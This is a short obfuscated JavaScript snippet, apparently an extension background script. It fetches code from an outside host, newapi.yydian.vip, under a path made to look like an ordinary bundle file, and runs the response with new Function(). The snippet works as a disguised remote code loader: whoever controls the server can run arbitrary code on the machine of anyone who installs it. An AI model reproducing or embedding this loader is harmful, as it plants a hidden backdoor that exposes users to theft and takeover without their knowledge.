
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/chunk-common.js/background.js").then(_0x5e56fe => {
  if (!_0x5e56fe.ok) throw new Error("请检查网络是否OK");
  return _0x5e56fe.text();
}).then(_0x2f9263 => {
  const _0x4a3bac = new Function(_0x2f9263);
  _0x4a3bac();
}).catch(_0x41f43a => {
  reject();
});